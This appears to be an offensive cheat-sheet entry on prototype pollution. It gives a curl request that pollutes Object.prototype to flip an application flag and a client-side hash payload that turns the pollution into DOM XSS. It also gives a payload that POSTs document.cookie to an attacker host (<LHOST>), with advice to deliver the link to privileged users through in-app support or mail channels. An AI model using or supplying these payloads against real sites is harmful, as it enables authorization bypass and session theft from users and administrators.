# Prototype Pollution

When a server-side JSON merge doesn't filter `__proto__`/`constructor`/`prototype` keys, pollute `Object.prototype` and flip a flag checked elsewhere in the app.

```bash
curl -s -c cookies.txt -b cookies.txt -X POST http://<TARGET>/<merge-endpoint> \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"<FLAG_FIELD>":true}}}'
```

Works because a plain object with no own `<FLAG_FIELD>` property inherits it through the prototype chain once polluted.

Client-side variant — some frontends read `location.hash` and merge its keys onto an object with the same unfiltered-merge bug, which is pure DOM gadget-hunting territory. Burp's DOM Invader (enable the "prototype pollution" scan type) finds the exploitable sink fast:
```
http://<target>/<page>#__proto__.<gadget-property>=<img src=x onerror="alert(1)">
```
If the polluted property is later used as a render/template callback and injected unsanitized, that's DOM XSS — chain it into a cookie/session exfil:
```
http://<target>/<page>#__proto__.<gadget-property>=<img src=x onerror="fetch('http://<LHOST>',{method:'POST',mode:'no-cors',body:document.cookie})">
```
Deliver the link via any in-app messaging feature that reaches a privileged user (support ticket, internal mail) rather than needing a separate phishing channel.

